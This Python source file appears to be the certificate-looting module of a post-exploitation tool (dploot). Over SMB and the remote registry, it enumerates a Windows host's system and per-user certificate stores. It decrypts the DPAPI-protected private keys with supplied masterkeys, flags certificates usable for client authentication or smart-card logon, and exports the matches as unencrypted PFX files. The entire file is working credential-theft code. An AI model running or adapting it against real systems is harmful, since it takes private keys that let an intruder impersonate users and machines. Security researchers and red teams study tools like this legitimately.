import hashlib
import logging
import ntpath
from typing import Dict, List, Tuple

from impacket.dcerpc.v5 import rrp

from Cryptodome.PublicKey import RSA
from cryptography import x509
from cryptography.hazmat._oid import ExtensionOID
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12, PublicFormat, load_der_private_key
from pyasn1.codec.der import decoder
from pyasn1.type.char import UTF8String

from dploot.lib.crypto import CERTBLOB
from dploot.lib.dpapi import decrypt_privatekey, find_masterkey_for_privatekey_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_certificate_guid

PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")

class CertificatesTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    system_capi_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\RSA",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
    ]
    system_cng_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\Keys",
        "ProgramData\\Microsoft\\Crypto\\SystemKeys",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
    ]
    user_capi_keys_generic_path = [
        'Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\RSA',
    ]
    user_cng_keys_generic_path = [
        'Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\Keys',
    ]
    user_mycertificates_generic_path = [
        'Users\\%s\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates'
    ]
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
        self.target = target
        self.conn = conn
        
        self._is_admin = None
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_system_certificates(self) -> None:
        logging.info('Triage SYSTEM Certificates')
        self.conn.enable_remoteops()
        pkeys = self.loot_privatekeys()
        certificates = self.loot_system_certificates()
        if len(pkeys) > 0 and len(certificates) > 0:
            self.correlate_certificates_and_privatekeys(certificates=certificates, private_keys=pkeys)
        print()

    def loot_system_certificates(self) -> Dict[str,x509.Certificate]:
        my_certificates_key = 'SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates'
        ans = rrp.hOpenLocalMachine(self.conn.remote_ops._RemoteOperations__rrp)
        regHandle = ans['phKey']
        certificate_keys = list()
        enumerated = False
        index = 0
        certificates = dict()
        try:
            ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, my_certificates_key)
            keyHandle = ans['phkResult']
            while not enumerated:
                enum_ans = rrp.hBaseRegEnumKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, str(index))
                if len(certificate_keys) > 0:
                    if  enum_ans['lpNameOut'][:-1] in certificate_keys:
                        enumerated = True
                        continue
                certificate_keys.append(enum_ans['lpNameOut'][:-1])
                index += 1
            rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
            for certificate_key in certificate_keys:
                regKey = my_certificates_key + '\\' + certificate_key
                ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey)
                keyHandle = ans['phkResult']
                _, certblob_bytes = rrp.hBaseRegQueryValue(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 'Blob')
                with open('temp','wb') as f:
                    f.write(certblob_bytes)
                certblob = CERTBLOB(certblob_bytes)

                if certblob.der is not None:
                    cert = self.der_to_cert(certblob.der)
                    certificates[certificate_key] = cert
                rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
        except rrp.DCERPCSessionError as e:
            if e.error_code == 2:
                return 'ERROR_FILE_NOT_FOUND'
            else:
                return e.__str__
        return certificates

    def triage_certificates(self) -> None:
        logging.info('Triage Certificates for ALL USERS')
        for user in self.users:
            try:
                self.triage_certificates_for_user(user=user)                         
            except Exception as e:
                print(str(e))
                pass
        print()

    def triage_certificates_for_user(self, user: str) -> None:
        pkeys = self.loot_privatekeys(privatekeys_paths=[elem % user for elem in self.user_capi_keys_generic_path])                         
        certificates = self.loot_certificates(certificates_paths=[elem % user for elem in self.user_mycertificates_generic_path])
        if len(pkeys) > 0 and len(certificates) > 0:
            self.correlate_certificates_and_privatekeys(certificates=certificates, private_keys=pkeys)

    def loot_privatekeys(self, privatekeys_paths: List[str] = system_capi_keys_generic_path) -> Dict[str, Tuple[str,RSA.RsaKey]]:
        pkeys = dict()
        pkeys_dirs = self.conn.listDirs(self.share, privatekeys_paths)
        for pkeys_path,pkeys_dir in pkeys_dirs.items():
            if pkeys_dir is not None:
                for d in pkeys_dir:
                    if d not in self.false_positive and d.is_directory()>0 and (d.get_longname()[:2] == 'S-' or d.get_longname() == 'MachineKeys'):
                        sid = d.get_longname()
                        pkeys_sid_path = ntpath.join(pkeys_path,sid)
                        pkeys_sid_dir = self.conn.remote_list_dir(self.share, path=pkeys_sid_path)
                        for file in pkeys_sid_dir:
                            if file.is_directory() == 0 and is_certificate_guid(file.get_longname()):
                                pkey_guid = file.get_longname()
                                filepath = ntpath.join(pkeys_sid_path,pkey_guid)
                                logging.info("Found PrivateKey Blob: \\\\%s\\%s\\%s" %  (self.target.address,self.share,filepath))
                                pkey_bytes = self.conn.readFile(self.share, filepath)
                                if pkey_bytes is not None and self.masterkeys is not None:
                                    self.looted_files[pkey_guid] = pkey_bytes
                                    masterkey = find_masterkey_for_privatekey_blob(pkey_bytes, masterkeys=self.masterkeys)
                                    if masterkey is not None:
                                        pkey = decrypt_privatekey(privatekey_bytes=pkey_bytes, masterkey=masterkey)
                                        pkeys[hashlib.md5(pkey.public_key().export_key('DER')).hexdigest()] = (pkey_guid,pkey)
        return pkeys

    def loot_certificates(self, certificates_paths: List[str]) -> Dict[str, x509.Certificate]:
        certificates = dict()
        certificates_dir = self.conn.listDirs(self.share, certificates_paths)
        for cert_dir_path,cert_dir in certificates_dir.items():
            if cert_dir is not None:
                for cert in cert_dir:
                    if cert not in self.false_positive and cert.is_directory()==0:
                        certname = cert.get_longname()
                        certpath = ntpath.join(cert_dir_path, certname)
                        logging.info("Found Certificates Blob: \\\\%s\\%s\\%s" %  (self.target.address,self.share,certpath))
                        certbytes = self.conn.readFile(self.share, certpath)
                        self.looted_files[certname] = certbytes
                        certblob = CERTBLOB(certbytes)
                        if certblob.der is not None:
                            cert = self.der_to_cert(certblob.der)
                            certificates[certname] = cert
        return certificates

    def correlate_certificates_and_privatekeys(self, certificates: Dict[str, x509.Certificate], private_keys: Dict[str, Tuple[str,RSA.RsaKey]]) -> None:
        for name, cert in certificates.items():
            if hashlib.md5(cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)).hexdigest() in private_keys.keys():
                # Matching public and private key
                pkey = private_keys[hashlib.md5(cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)).hexdigest()]
                logging.info("Found match between %s certificate and %s private key !" % (name, pkey[0]))
                key = load_der_private_key(pkey[1].export_key('DER'), password=None)
                pfx = self.create_pfx(key=key,cert=cert)
                print()
                print('Issuer:\t\t\t%s' % str(cert.issuer.rfc4514_string()))
                print('Subject:\t\t%s' % str(cert.subject.rfc4514_string()))
                print('Valid Date:\t\t%s' % cert.not_valid_before)
                print('Expiry Date:\t\t%s' % cert.not_valid_after)
                print('Extended Key Usage:')
                clientauth = False
                for i in cert.extensions.get_extension_for_oid(oid=ExtensionOID.EXTENDED_KEY_USAGE).value:
                    print('\t%s (%s)'%(i._name, i.dotted_string))
                    if i.dotted_string in [
                        '1.3.6.1.5.5.7.3.2', # Client Authentication
                        '1.3.6.1.5.2.3.4', # PKINIT Client Authentication
                        '1.3.6.1.4.1.311.20.2.2', # Smart Card Logon
                        '2.5.29.37.0', # Any Purpose
                    ]:
                        print("\t[!] Certificate is used for client auth!")
                        clientauth = True
                print()
                print((cert.public_bytes(Encoding.PEM).decode('utf-8')))

                if not clientauth:
                    ask = input('Certificate without client authentication EKU. Write to PFX anyway ? [Yes / [No]] ')
                    if ask.upper() not in ["Y", "YES"]:
                        return

                username = self.get_id_from_certificate(certificate=cert)[1].replace('@','_')
                filename = "%s_%s.pfx" % (username,name[:16])

                logging.info("Writting certificate to %s\n" % filename)
                with open(filename, "wb") as f:
                    f.write(pfx)

    def der_to_cert(self,certificate: bytes) -> x509.Certificate:
        return x509.load_der_x509_certificate(certificate)

    def create_pfx(self, key: rsa.RSAPrivateKey, cert: x509.Certificate) -> bytes:
        return pkcs12.serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )

    def get_id_from_certificate(self,certificate: x509.Certificate) -> Tuple[str, str]:
        try:
            san = certificate.extensions.get_extension_for_oid(
                ExtensionOID.SUBJECT_ALTERNATIVE_NAME
            )

            for name in san.value.get_values_for_type(x509.OtherName):
                if name.type_id == PRINCIPAL_NAME:
                    return (
                        "UPN",
                        decoder.decode(name.value, asn1Spec=UTF8String)[0].decode(),
                    )

            for name in san.value.get_values_for_type(x509.DNSName):
                return "DNS Host Name", name
        except:
            pass

        return None, None

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users